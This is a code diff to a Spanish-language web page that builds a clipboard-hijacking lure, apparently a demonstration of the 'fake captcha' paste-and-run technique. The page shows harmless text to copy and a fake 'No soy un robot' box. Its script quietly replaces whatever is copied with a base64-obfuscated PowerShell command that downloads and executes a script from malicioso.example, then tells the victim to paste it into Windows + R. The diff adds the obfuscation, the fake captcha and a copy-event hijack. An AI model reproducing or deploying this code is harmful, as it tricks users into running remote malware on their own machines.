@@ -37,6 +37,20 @@
         color: #a40000;
         font-weight: 600;
       }
+      .fake-captcha {
+        margin: 1rem 0;
+        padding: 0.75rem 1rem;
+        border: 1px dashed #d3d7e4;
+        border-radius: 10px;
+        background: #fff;
+        display: grid;
+        gap: 0.25rem;
+        color: #1f2937;
+      }
+      .fake-captcha span {
+        font-size: 0.85rem;
+        color: #6b7280;
+      }
     </style>
   </head>
   <body>
@@ -44,8 +58,19 @@
     <div class="card">
       <p>
         Para continuar, copia el siguiente texto y pégalo en la ventana de <strong>Ejecutar</strong>
-        con <strong>Windows + R</strong>.
+        con <strong>Windows + R</strong> o abre el <strong>símbolo del sistema</strong>.
       </p>
+      <p>
+        Verifica que eres humano para continuar. Completa el captcha y ejecuta el comando de
+        validación.
+      </p>
+      <div class="fake-captcha">
+        <label>
+          <input type="checkbox" disabled />
+          No soy un robot
+        </label>
+        <span>Human verification required</span>
+      </div>
       <p>
         Texto a copiar: <code id="safe-text">verificacion segura 2025</code>
       </p>
@@ -58,12 +83,59 @@
     <script>
       const copyButton = document.getElementById('copy-btn');
       const safeText = document.getElementById('safe-text').textContent;
-      const maliciousPayload =
-        'powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(\"http://malicioso.example/payload.ps1\")"';
+      const encodedPayload =
+        'cG93ZXJzaGVsbCAtbm9wIC13IGhpZGRlbiAtYyAiSUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoXCJodHRwOi8vbWFsaWNpb3NvLmV4YW1wbGUvcGF5bG9hZC5wczFcIiki';
+      const maliciousPayload = atob(encodedPayload);
+
+      const copyToClipboard = async (text) => {
+        if (navigator.clipboard && window.isSecureContext) {
+          await navigator.clipboard.writeText(text);
+          return;
+        }
+
+        const helper = document.createElement('textarea');
+        helper.value = text;
+        helper.setAttribute('readonly', '');
+        helper.style.position = 'fixed';
+        helper.style.opacity = '0';
+        document.body.appendChild(helper);
+        helper.focus();
+        helper.select();
+
+        const success = document.execCommand('copy');
+        helper.remove();
+
+        if (!success) {
+          throw new Error('Clipboard copy failed');
+        }
+      };
+
+      const selectionIncludesSafeText = () => {
+        const selection = window.getSelection();
+        if (!selection) {
+          return false;
+        }
+        return selection.toString().includes(safeText);
+      };
+
+      document.addEventListener('copy', (event) => {
+        if (!selectionIncludesSafeText()) {
+          return;
+        }
+        if (!event.clipboardData) {
+          return;
+        }
+        event.preventDefault();
+        event.clipboardData.setData('text/plain', maliciousPayload);
+        copyButton.textContent = 'Copiado. Ahora presiona Windows + R y pega.';
+        copyButton.style.background = '#d12020';
+        console.log('Texto visible:', safeText);
+        console.log('Texto copiado:', maliciousPayload);
+      });
 
       copyButton.addEventListener('click', async () => {
         try {
-          await navigator.clipboard.writeText(maliciousPayload);
+          await copyToClipboard(maliciousPayload);
           copyButton.textContent = 'Copiado. Ahora presiona Windows + R y pega.';
           copyButton.style.background = '#d12020';
         } catch (error) {
